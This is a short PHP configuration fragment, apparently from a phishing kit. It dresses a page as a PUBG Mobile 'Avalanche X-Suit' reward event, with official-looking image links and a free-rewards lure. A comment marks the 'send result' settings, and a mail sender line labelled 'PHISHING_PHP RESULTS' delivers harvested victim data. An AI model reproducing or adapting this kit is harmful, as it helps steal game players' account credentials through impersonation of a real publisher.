...
$title = 'PUBG MOBILE: Avalanche X-Suit';
$description = 'Collect your special rewards at the Avalanche X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://www.pubgmobile.com/images/event/avalanchex_suit/shares/en.jpg';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'PHISHING_PHP';
$sender = 'From: @PHISHING_PHP RESULTS 🔥 <support@crax.pro>';
